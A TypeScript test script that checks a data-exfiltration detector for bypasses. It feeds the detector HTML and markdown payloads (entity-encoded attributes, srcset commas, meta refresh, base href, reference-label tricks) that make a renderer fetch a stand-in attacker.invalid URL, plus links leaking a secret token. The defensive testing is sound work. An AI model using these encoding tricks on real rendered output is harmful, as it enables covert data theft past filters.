// T72 — the decode decision, and the CLASS around it.
//
// The dispatch's row 1 asks two things beyond "are the seven spellings closed":
//   (a) attack the decision to decode inside `hasAttributeValue` rather than at
//       the two call sites — i.e. enumerate EVERY other branch that reads an
//       attribute and ask whether any of them still compares something a
//       renderer would decode first;
//   (b) confirm exact matching survived and the mask lands on raw bytes
//       (measured in T72-boundary.ts).
//
// Enumeration method for (a): `detectExfil`'s HTML loop was read line by line
// (exfil.ts:1059-1195). Every place that consults an attribute is listed below
// as a row with the question "does a renderer decode this before reading it?".
// Two value-grammar reads outside the HTML loop are included for the same
// reason: the `srcset` candidate split and the markdown sensitive-value gate.
//
// Oracle: Bun's HTMLRewriter (lol-html), a spec-derived tokenizer with no
// relationship to this codebase, for the decoded attribute value; the HTML
// srcset "parse a srcset attribute" split is then applied to THAT value.
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T72-gates.ts [out.json]
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "cdn.example.org";

// --- oracle: what value does a conformant tokenizer hand the renderer? -------
async function tokenizerAttribute(html: string, tag: string, name: string): Promise<string | null> {
  let value: string | null = null;
  const rewriter = new HTMLRewriter().on(tag, {
    element(el) {
      if (value === null) value = el.getAttribute(name);
    },
  });
  await rewriter.transform(new Response(html)).text();
  return value;
}

// The HTML "parse a srcset attribute" candidate split, applied to the DECODED
// value: split on commas, then take the leading non-whitespace run of each.
function srcsetCandidates(decoded: string): string[] {
  return decoded
    .split(",")
    .map((c) => c.trim().split(/\s+/)[0] ?? "")
    .filter((c) => c.length > 0);
}

type Row = {
  id: string;
  branch: string;
  text: string;
  rendererSees: string;
  rendererFetchesAttacker: boolean;
  detectorFindings: number;
  detectorHostsFlagged: string[];
  verdict: string;
};

const rows: Row[] = [];

async function attributeRow(
  id: string,
  branch: string,
  text: string,
  tag: string,
  name: string,
  allowlist: string[],
  rendererFetches: (decoded: string) => boolean,
) {
  const decoded = (await tokenizerAttribute(text, tag, name)) ?? "";
  const findings = detectExfil(text, allowlist);
  const flagged = findings.map((f) => String(f.value));
  rows.push({
    id,
    branch,
    text,
    rendererSees: decoded,
    rendererFetchesAttacker: rendererFetches(decoded),
    detectorFindings: findings.length,
    detectorHostsFlagged: flagged,
    verdict:
      rendererFetches(decoded) && !flagged.some((v) => v.includes(ATT))
        ? "BYPASS"
        : "ok",
  });
}

// 1. `hasAttributeValue` — the two gates the repair fixed (control).
await attributeRow(
  "gateInputType",
  "hasAttributeValue(input/type) — exfil.ts:1087",
  `<input type="&#105;mage" src="${U}">`,
  "input",
  "type",
  [],
  () => true,
);
await attributeRow(
  "gateMetaHttpEquiv",
  "hasAttributeValue(meta/http-equiv) — exfil.ts:1091",
  `<meta http-equiv="&#114;efresh" content="0;url=${U}">`,
  "meta",
  "http-equiv",
  [],
  () => true,
);

// 2. `attribute.name` lookups — a tokenizer does NOT decode attribute NAMES, so
//    a reference inside a name is not the same attribute for a renderer either.
await attributeRow(
  "nameNotDecoded",
  "FETCHING_ATTRIBUTES[attribute.name] — exfil.ts:1157",
  `<img sr&#99;="${U}">`,
  "img",
  "src",
  [],
  (decoded) => decoded.includes(ATT),
);

// 3. `metaRefreshDestination` — decodes (control).
await attributeRow(
  "metaContentDecoded",
  "metaRefreshDestination — exfil.ts:1104",
  `<meta http-equiv="refresh" content="0&#59;url=${U}">`,
  "meta",
  "content",
  [],
  () => true,
);

// 4. `<base href>` → considerUrl → renderableUrl decodes (control).
await attributeRow(
  "baseHrefDecoded",
  "base/href — exfil.ts:1139",
  `<base href="https&#58;//${ATT}/">`,
  "base",
  "href",
  [],
  () => true,
);

// 5. THE SRCSET CANDIDATE SPLIT — the one remaining value-GRAMMAR read that runs
//    on the RAW bytes. A renderer decodes the attribute value, THEN splits.
for (const [id, allowlist] of [
  ["srcsetCommaRefEmptyAllowlist", [] as string[]],
  ["srcsetCommaRefAllowlisted", [OK]],
] as const) {
  const text = `<img srcset="https://${OK}/a.png&#44;${U} 2x">`;
  const decoded = (await tokenizerAttribute(text, "img", "srcset")) ?? "";
  const candidates = srcsetCandidates(decoded);
  const findings = detectExfil(text, [...allowlist]);
  const flagged = findings.map((f) => String(f.value));
  rows.push({
    id,
    branch: "srcset candidate split on the RAW value — exfil.ts:1179",
    text,
    rendererSees: `${decoded}  => candidates ${JSON.stringify(candidates)}`,
    rendererFetchesAttacker: candidates.some((c) => c.includes(ATT)),
    detectorFindings: findings.length,
    detectorHostsFlagged: flagged,
    verdict:
      candidates.some((c) => c.includes(ATT)) && !flagged.some((v) => v.includes(ATT))
        ? "BYPASS"
        : "ok",
  });
}

// 6. THE MARKDOWN SENSITIVE-VALUE GATE — SENSITIVE_URL_VALUE.test runs on the
//    RAW destination; CommonMark decodes entity references in a destination
//    before the href reaches the DOM. AC5's second clause is "a URL secret is
//    masked".
{
  const { marked } = await import("marked");
  for (const [id, text] of Object.entries({
    linkSecretPlain: `[report](https://docs.example.org/p?token=SUPERSECRET)`,
    linkSecretCharrefEquals: `[report](https://docs.example.org/p?token&#61;SUPERSECRET)`,
    linkSecretCharrefName: `[report](https://docs.example.org/p?tok&#101;n=SUPERSECRET)`,
    linkSecretCharrefAmp: `[report](https://docs.example.org/p?a=1&#38;token=SUPERSECRET)`,
  })) {
    const html = String(await marked.parse(text, { async: true }));
    const href = /href="([^"]*)"/.exec(html)?.[1] ?? "";
    const rendered = /[?&]token=SUPERSECRET/.test(href);
    const findings = detectExfil(text, []);
    rows.push({
      id,
      branch: "SENSITIVE_URL_VALUE.test(inline.url) on the RAW url — exfil.ts:1001",
      text,
      rendererSees: href,
      rendererFetchesAttacker: rendered,
      detectorFindings: findings.length,
      detectorHostsFlagged: findings.map((f) => String(f.value)),
      verdict: rendered && findings.length === 0 ? "BYPASS(secret-in-url)" : "ok",
    });
  }

  // 7. reference LABEL normalisation — CommonMark folds whitespace and decodes
  //    entity references in a label; the detector matches trim().toLowerCase().
  for (const [id, text] of Object.entries({
    labelEntitySpelling: `![a][b&#99;]\n\n[bc]: ${U}\n`,
    labelInnerWhitespace: `![a][b  c]\n\n[b c]: ${U}\n`,
    labelNewlineInLabel: `![a][b\nc]\n\n[b c]: ${U}\n`,
    labelUnicodeCase: `![a][STRASSE]\n\n[strasse]: ${U}\n`,
  })) {
    const html = String(await marked.parse(text, { async: true }));
    const fetches = /<img[^>]*src="[^"]*attacker\.invalid/.test(html);
    const findings = detectExfil(text, []);
    rows.push({
      id,
      branch: "reference label normalisation — exfil.ts:1042 / :974",
      text: text.replace(/\n/g, "\\n"),
      rendererSees: html.replace(/\n/g, " ").slice(0, 110),
      rendererFetchesAttacker: fetches,
      detectorFindings: findings.length,
      detectorHostsFlagged: findings.map((f) => String(f.value)),
      verdict: fetches && findings.length === 0 ? "BYPASS" : "ok",
    });
  }
}

for (const r of rows) {
  console.log(
    `${r.id.padEnd(30)} rendererFetches=${String(r.rendererFetchesAttacker).padEnd(5)} n=${String(r.detectorFindings).padEnd(2)} verdict=${r.verdict.padEnd(22)} rendererSees=${JSON.stringify(r.rendererSees).slice(0, 120)}`,
  );
}
const summary = {
  rows: rows.length,
  bypasses: rows.filter((r) => r.verdict !== "ok").map((r) => `${r.id}:${r.verdict}`),
  branchesEnumerated: [...new Set(rows.map((r) => r.branch))],
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows }, null, 2));
